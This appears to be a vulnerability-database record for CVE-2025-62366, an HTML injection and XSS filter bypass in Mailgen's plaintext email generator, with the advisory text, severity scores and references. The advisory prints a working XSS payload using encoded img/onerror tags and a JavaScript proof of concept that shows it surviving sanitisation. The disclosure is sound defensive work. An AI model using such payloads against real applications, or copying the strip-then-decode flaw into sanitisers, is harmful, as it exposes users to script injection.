vulnerability_id: VCID-8bg6-pru8-2qaj
aliases:
  - CVE-2025-62366
  - GHSA-xw6r-chmh-vpmj
summary: "Mailgen has HTML Injection and XSS Filter Bypass in Plaintext Emails\n### Summary\n\
  \nAn HTML injection vulnerability in plaintext emails generated by Mailgen has been discovered.\
  \ Your project is affected if you use the `Mailgen.generatePlaintext(email)` method and pass\
  \ in user-generated content. The issue was discovered and reported by Edoardo Ottavianelli\
  \ (@edoardottt).\n\n### Details\n\nThe following function (inside index.js) is intended to\
  \ strip all HTML content to produce a plaintext string.\n\n```javascript\n// Plaintext text\
  \ e-mail generator\nMailgen.prototype.generatePlaintext = function (params) {\n    // Plaintext\
  \ theme not cached?\n    if (!this.cachedPlaintextTheme) {\n        throw new Error('An error\
  \ was encountered while loading the plaintext theme.');\n    }\n   \n    // Parse email params\
  \ and get back an object with data to inject\n    var ejsParams = this.parseParams(params);\n\
  \n    // Render the plaintext theme with ejs, injecting the data accordingly\n    var output\
  \ = ejs.render(this.cachedPlaintextTheme, ejsParams);\n\n    // Definition of the <br /> tag\
  \ as a regex pattern\n    var breakTag = /(?:\\<br\\s*\\/?\\>)/g;\n    var breakTagPattern\
  \ = new RegExp(breakTag);\n\n    // Check the plaintext for html break tag, maintains backwards\
  \ compatiblity\n    if (breakTagPattern.test(this.cachedPlaintextTheme)) {\n        // Strip\
  \ all linebreaks from the rendered plaintext\n        output = output.replace(/(?:\\r\\n|\\\
  r|\\n)/g, '');\n\n        // Replace html break tags with linebreaks\n        output = output.replace(breakTag,\
  \ '\\n');\n\n        // Remove plaintext theme indentation (tabs or spaces in the beginning\
  \ of each line)\n        output = output.replace(/^(?: |\\t)*/gm, \"\");\n    }\n\n    //\
  \ Strip all HTML tags from plaintext output\n    output = output.replace(/<.+?>/g, '');\n\n\
  \    // Decode HTML entities such as &copy;\n    output = he.decode(output);\n\n    // All\
  \ done!\n    return output;\n};\n```\nThe process fails because it searches for HTML tags\
  \ and attempts to strip them from the input. However, if the HTML tags are encoded, they are\
  \ not removed. These encoded tags are then decoded later and become valid HTML content, which\
  \ can lead to XSS vulnerabilities.\n\nA valid payload is: `&ltimg src=xyz onerror=alert(1)&gt`.\n\
  \n### PoC\n\n```javascript\nvar Mailgen = require('mailgen');\n\n// Configure mailgen by setting\
  \ a theme and your product info\nvar mailGenerator = new Mailgen({\n    theme: 'default',\n\
  \    product: {\n        // Appears in header & footer of e-mails\n        name: 'Mailgen',\n\
  \        link: 'https://mailgen.js/'\n        // Optional product logo\n        // logo: 'https://mailgen.js/img/logo.png'\n\
  \    }\n});\n\nvar email = {\n    body: {\n        name: 'John &ltimg src=x onerror=alert(document.body.innerHTML)&gt\
  \ Appleseed',\n        intro: 'Welcome to Mailgen! We\\'re very excited to have you on board.',\n\
  \        action: {\n            instructions: 'To get started with Mailgen, please click here:',\n\
  \            button: {\n                color: '#22BC66', // Optional action button color\n\
  \                text: 'Confirm your account',\n                link: 'secret-link'\n    \
  \        }\n        },\n        outro: 'Need help, or have questions? Just reply to this email,\
  \ we\\'d love to help.'\n    }\n};\n\nvar emailText = mailGenerator.generatePlaintext(email);\n\
  require('fs').writeFileSync('emailText.html', emailText, 'utf8');\n```\n\n**Resulting output\
  \ file (emailText.html)**:\n\n```HTML\nHi John <img src=x onerror=alert(document.body.innerHTML)>\
  \ Appleseed,\n\nWelcome to Mailgen! We're very excited to have you on board.        \n\nTo\
  \ get started with Mailgen, please click here:        \nsecret-link            \n\nNeed help,\
  \ or have questions? Just reply to this email, we'd love to help.        \n\nYours truly,\
  \  \nMailgen\n\nÂ© 2025 Mailgen. All rights reserved.\n```\n\n### Impact\n\nDepending on the\
  \ context/environment where the plaintext message is used, if HTML is rendered and executed\
  \ can result in arbitrary code execution in the browser of the victim (potentially stealing\
  \ secrets or sensitive information contained in the message).\n\n### Credits\n\nEdoardo Ottavianelli\
  \ (@edoardottt)"
severities:
  - score: '0.00077'
    scoring_system: epss
    scoring_elements: '0.23625'
    published_at: '2025-10-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00077'
    scoring_system: epss
    scoring_elements: '0.23683'
    published_at: '2025-10-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00077'
    scoring_system: epss
    scoring_elements: '0.2369'
    published_at: '2025-10-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00077'
    scoring_system: epss
    scoring_elements: '0.23675'
    published_at: '2025-10-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00077'
    scoring_system: epss
    scoring_elements: '0.23665'
    published_at: '2025-10-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28621'
    published_at: '2025-10-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28607'
    published_at: '2025-10-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28615'
    published_at: '2025-10-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28538'
    published_at: '2025-10-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28625'
    published_at: '2025-10-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.2867'
    published_at: '2025-11-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28697'
    published_at: '2025-11-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28642'
    published_at: '2025-10-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00101'
    scoring_system: epss
    scoring_elements: '0.28626'
    published_at: '2025-10-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.30921'
    published_at: '2026-01-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.30958'
    published_at: '2026-01-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
  - score: LOW
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-xw6r-chmh-vpmj
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/eladnava/mailgen
  - score: '2.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P
    published_at: None
    url: https://github.com/eladnava/mailgen/commit/7279a983481d05c51aa451e86146f98aaa42fee9
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/eladnava/mailgen/commit/7279a983481d05c51aa451e86146f98aaa42fee9
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:07:32Z/
    published_at: None
    url: https://github.com/eladnava/mailgen/commit/7279a983481d05c51aa451e86146f98aaa42fee9
  - score: LOW
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/eladnava/mailgen/security/advisories/GHSA-xw6r-chmh-vpmj
  - score: '2.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P
    published_at: None
    url: https://github.com/eladnava/mailgen/security/advisories/GHSA-xw6r-chmh-vpmj
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/eladnava/mailgen/security/advisories/GHSA-xw6r-chmh-vpmj
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-10-14T16:07:32Z/
    published_at: None
    url: https://github.com/eladnava/mailgen/security/advisories/GHSA-xw6r-chmh-vpmj
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62366
weaknesses:
  - CWE-79
  - CWE-1035
  - CWE-937
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-62366
    reference_type:
    reference_id:
  - url: https://github.com/eladnava/mailgen
    reference_type:
    reference_id:
  - url: https://github.com/eladnava/mailgen/commit/7279a983481d05c51aa451e86146f98aaa42fee9
    reference_type:
    reference_id:
  - url: https://github.com/eladnava/mailgen/security/advisories/GHSA-xw6r-chmh-vpmj
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-62366
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-xw6r-chmh-vpmj
    reference_type:
    reference_id: GHSA-xw6r-chmh-vpmj
